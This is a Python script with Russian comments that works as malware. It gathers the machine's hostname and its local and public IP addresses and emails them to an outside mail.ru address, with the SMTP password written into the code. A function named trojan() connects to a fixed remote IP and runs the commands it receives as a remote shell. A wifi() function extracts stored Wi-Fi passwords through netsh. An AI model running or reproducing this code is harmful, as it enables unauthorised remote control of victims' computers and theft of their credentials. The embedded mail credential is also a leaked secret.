import smtplib as smtp
import random
import socket
import threading
import os
from getpass import getpass
from requests import get
import subprocess
import time

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
public_ip = get('http://api.ipify.org').text
def mail():
    src_mail = 'pecik_228@mail.ru'
    password_SMTP = 'uuQsFq9RiJMxgRmiwLuD'

    dest_mail = 'quarkquest@mail.ru'

    mail_text = (f'Host: {hostname}\nLocal IP: {local_ip}\nPublic IP: {public_ip}')
    message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(src_mail, dest_mail, 'IP', mail_text)

    server = smtp.SMTP_SSL('smtp.mail.ru')

    server.login(src_mail, password_SMTP)
    server.auth_plain()
    server.sendmail(src_mail, dest_mail, message)
    server.quit()
def trojan():
    # IP-адрес атакуемого
    HOST = '198.168.0.115'
    # Порт, по которому мы работаем
    PORT = 9090
    # Создаем эхо-сервер
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
    while True:
        # Вводим команду серверу
        server_command = client.recv(1024).decode('cp866')
        # Если команда совпала с ключевым словом 'cmdon', запускаем режим работы с терминалом
        if server_command == 'cmdon':
            cmd_mode = True
            # Отправляем информацию на сервер
            client.send('Получен доступ к терминалу'.encode('cp866'))
            continue
        # Если команда совпала с ключевым словом 'cmdoff', выходим из режима работы с терминалом
        if server_command == 'cmdoff':
            cmd_mode = False
        # Если запущен режим работы с терминалом, вводим команду в терминал через сервер
        if cmd_mode:
            os.popen(server_command)
        # Если же режим работы с терминалом выключен — можно вводить любые команды
        else:
            if server_command == 'hello':
                print('Hello World!')
        # Если команда дошла до клиента — выслать ответ
        client.send(f'{server_command} успешно отправлена!'.encode('cp866'))
def wifi():
    # Создаем запрос в командной строке netsh wlan show profiles, декодируя его по кодировке в самом ядре
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp866').split('\n')
    # Создаем список всех названий всех профилей сети (имена сетей)
    Ws = [line.split(':')[1][1:-1] for line in data if "Все профили пользователей" in line]
    # Для каждого имени...
    for Wi in Ws:
        # ...вводим запрос netsh wlan show profile [ИМЯ_Сети] key=clear
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', Wi, 'key=clear']).decode(
            'cp866').split('\n')
        # Забираем ключ
        results = [line.split(':')[1][1:-1] for line in results if "Содержимое ключа" in line]
        # Пытаемся его вывести в командной строке, отсекая все ошибки
        try:
            print(f'Имя сети: {Wi}, Пароль: {results[0]}')
        except IndexError:
            print(f'Имя сети: {Wi}, Пароль не найден!')
wifi()